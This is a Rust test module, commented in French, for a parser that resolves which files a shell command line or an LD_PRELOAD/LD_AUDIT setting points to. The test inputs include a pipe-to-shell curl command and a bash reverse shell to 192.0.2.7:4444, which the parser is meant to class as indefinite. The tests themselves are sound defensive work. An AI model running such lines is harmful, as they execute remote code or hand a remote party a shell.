            commande("/opt/x --a=b:./c", Contexte::Shell),
            Designe::Indefini(Flou::Relatif)
        );
    }

    #[test]
    fn lignes_ambigues_indefinies() {
        for c in [
            "/bin/bash -c 'curl -s http://x | sh'",
            "/bin/bash -i >& /dev/tcp/192.0.2.7/4444 0>&1",
            "./run",
            "bin/agent",
            "$X/agent",
            "/opt/$(id -u)/a",
            "/tmp/a*",
            "~bob/.x/a",
            "%t/a",
            "/opt/a 'non fermé",
            "/opt/a\\ b",
            "/bin/sh -c '/tmp/x arg'",
            "@/opt/a bash",
            "",
            "/opt//a",
        ] {
            assert!(matches!(commande(c, U), Designe::Indefini(_)), "{c}");
        }
        let longue = (0..=CHEMINS_MAX)
            .map(|i| format!("/opt/{i}"))
            .collect::<Vec<_>>()
            .join(" ");
        assert_eq!(commande(&longue, U), Designe::Indefini(Flou::Trop));
        assert_eq!(
            commande(&format!("/{}", "a".repeat(CHEMIN_MAX)), U),
            Designe::Indefini(Flou::Trop)
        );
    }

    #[test]
    fn prechargements_designes() {
        assert_eq!(
            prechargement("export LD_PRELOAD=/opt/l/libz.so:/opt/l/liby.so"),
            chemins(&["/opt/l/libz.so", "/opt/l/liby.so"])
        );
        assert_eq!(prechargement("env = LD_PRELOAD,/tmp/a.so"), chemins(&["/tmp/a.so"]));
        assert_eq!(
            prechargement("LD_AUDIT DEFAULT=\"/opt/a.so /opt/b.so\""),
            chemins(&["/opt/a.so", "/opt/b.so"])
        );
        for l in [
            "echo $LD_PRELOAD",
            "export LD_PRELOAD=libz.so",
            "export LD_PRELOAD=~/.l/a.so",
            "export LD_PRELOAD=/a.so LD_AUDIT=/b.so",
            "export LD_PRELOAD=/a.so /b.so",
            "export LD_PRELOAD='$LIB/a.so'",
            "export LD_PRELOAD=\"/a.so",
            "export LD_PRELOAD=",
        ] {
            assert!(matches!(prechargement(l), Designe::Indefini(_)), "{l}");
        }
        assert_eq!(
            bibliotheques("/usr/lib/libx.so", Liste::Fichier),
            chemins(&["/usr/lib/libx.so"])
        );
        assert_eq!(
            bibliotheques("~/.l/a.so", Liste::Fichier),
            Designe::Indefini(Flou::Maison)
        );
        assert_eq!(
            bibliotheques("/lib/$PLATFORM/a.so", Liste::Variable),
            Designe::Indefini(Flou::Syntaxe)
        );
        // Trouvé par le fuzzing : « :// / » donnait le chemin « // ».
        assert_eq!(
            bibliotheques(":// /", Liste::Variable),
            Designe::Indefini(Flou::Syntaxe)
        );
        assert_eq!(
            bibliotheques("/a.so //a.so", Liste::Fichier),
            Designe::Indefini(Flou::Syntaxe)
        );
    }

    /// Campagne E, F1 : un octet qui n'est pas de l'UTF-8 (lu comme U+FFFD) ne se lie jamais, d'aucune source.
    #[test]
    fn octet_illisible_jamais_lie() {
        let f = "\u{FFFD}";
        assert_eq!(commande(&format!("/opt/a{f}"), U), Designe::Indefini(Flou::Octet));
        assert_eq!(
            commande(&format!("/usr/bin/bash /opt/r{f}.sh"), Contexte::Shell),
            Designe::Indefini(Flou::Octet)
        );
        assert_eq!(
            bibliotheques(&format!("/a{f}.so"), Liste::Fichier),
            Designe::Indefini(Flou::Octet)
        );
        assert_eq!(
            bibliotheques(&format!("/a{f}.so"), Liste::Variable),
            Designe::Indefini(Flou::Octet)
        );
        assert_eq!(
            prechargement(&format!("export LD_PRELOAD=/a{f}.so")),
            Designe::Indefini(Flou::Octet)
        );
    }

    /// Campagne E, F2 : après un programme inconnu, un mot qui n'est pas un chemin absolu (le programme peut le lire
    /// comme un fichier relatif au dossier courant) rend la ligne indéfinie ; une option reste permise. Un
    /// interpréteur au nom suffixé d'une version est reconnu comme tel.
    #[test]
    fn arguments_d_un_programme_inconnu() {
        for c in [
            "/opt/sync config.ini",
            "/opt/sync -",
            "/opt/sync --conf=reglages.ini",
            "/opt/sync --require=module",
            "/opt/sync --niveau=3",
            "/opt/sync a:/opt/b",
            "/opt/sync /opt/a,b",
        ] {
            assert_eq!(commande(c, Contexte::Shell), Designe::Indefini(Flou::Argument), "{c}");
        }
        assert_eq!(
            commande("/opt/sync --nuit -v /opt/donnees --journal=/var/log/a", Contexte::Shell),
            chemins(&["/opt/sync", "/opt/donnees", "/var/log/a"])
        );
        assert_eq!(
            commande("/opt/sync %h/.cache-x/a", U),
            chemins(&["/opt/sync", "/home/alice/.cache-x/a"])
        );
        // Le script d'un interpréteur lié, ses arguments suivent librement : ils ne sont pas des fichiers lancés.
        assert_eq!(
            commande("/usr/bin/bash %h/.cache-x/rappel.sh demain", U),
            chemins(&["/usr/bin/bash", "/home/alice/.cache-x/rappel.sh"])
        );
        for c in [
            "/usr/bin/tclsh8.6 rappel.tcl",
            "/usr/bin/node22 serveur.js",
            "/usr/bin/ruby3.3 a.rb",
        ] {
            assert_eq!(commande(c, Contexte::Shell), Designe::Indefini(Flou::Interprete), "{c}");
        }
        assert_eq!(
            commande("/usr/bin/tclsh8.6 /opt/a.tcl", Contexte::Shell),
            chemins(&["/usr/bin/tclsh8.6", "/opt/a.tcl"])
        );
    }

    /// Vérification de la campagne E, N1 : un chemin par /proc ou /dev se résout selon le processus qui le lit (son
    /// dossier de travail, son entrée), « . » et « .. » selon les liens du chemin ; jamais lié.
    #[test]
    fn chemins_qui_dependent_du_lecteur() {
        for c in [
            "/opt/sync /proc/self/cwd/rappel.sh",
            "/opt/sync /proc/self/fd/0",
            "/opt/sync /dev/stdin",
            "/opt/sync /dev/fd/0",
            "/opt/sync --conf=/proc/self/cwd/c.ini",
            "/opt/sync /opt/a:/proc/1/root/x",
            "/proc/self/exe",
            "/dev/shm/a",
            "/usr/bin/bash /proc/self/cwd/rappel.sh",
            "/usr/bin/bash /dev/stdin",
            "/usr/bin/bash /opt/a.sh /proc/self/cwd/b",
            "/opt/sync /opt/../home/alice/a",
            "/opt/sync /opt/./a",
            "/opt/./sync",
            "/opt/sync /proc",
        ] {
            assert_eq!(commande(c, Contexte::Shell), Designe::Indefini(Flou::Processus), "{c}");
        }
        assert_eq!(commande("%h/../bob/a", U), Designe::Indefini(Flou::Processus));
        assert_eq!(
            bibliotheques("/proc/self/cwd/a.so", Liste::Variable),
            Designe::Indefini(Flou::Processus)
        );
        assert_eq!(
            bibliotheques("/opt/a.so:/dev/fd/3", Liste::Fichier),
            Designe::Indefini(Flou::Processus)
        );
        // Ce qui ressemble sans l'être : « /procs », « /devtools », un nom qui contient des points.
        assert_eq!(
            commande("/opt/procs/a /devtools/b /opt/..x/c /opt/x.../d", Contexte::Shell),
            chemins(&["/opt/procs/a", "/devtools/b", "/opt/..x/c", "/opt/x.../d"])
        );
    }

    /// Vérification de la campagne E, N2 : après « -- », chaque mot est un nom de fichier, même s'il commence par un
    /// tiret ; la valeur d'une option n'est jamais une option. Les preuves : « outil -- -rappel.sh », « --a=-fichier ».
    #[test]
    fn mots_apres_les_options() {
        for c in [
            "/opt/outil -- -rappel.sh",
            "/opt/outil -v -- -rappel.sh",
            "/opt/outil -- /opt/a -b",
            "/opt/outil -- --",
            "/opt/outil -- rappel.sh",
            "/opt/outil --a=-fichier",
            "/opt/outil --a=--b",
            "/opt/outil --a=-",
        ] {
            assert_eq!(commande(c, Contexte::Shell), Designe::Indefini(Flou::Argument), "{c}");
        }
        assert_eq!(
            commande("/opt/outil -v -- /opt/a /opt/b", Contexte::Shell),
            chemins(&["/opt/outil", "/opt/a", "/opt/b"])
        );
        // Un interpréteur connu après « -- » : son script lié, la suite à lui.
        assert_eq!(
            commande("/usr/bin/bash -- /opt/a.sh -x", Contexte::Shell),
            chemins(&["/usr/bin/bash", "/opt/a.sh"])
        );
        assert_eq!(
            commande("/usr/bin/bash -- -rappel.sh", Contexte::Shell),
            Designe::Indefini(Flou::Interprete)
        );
    }
}
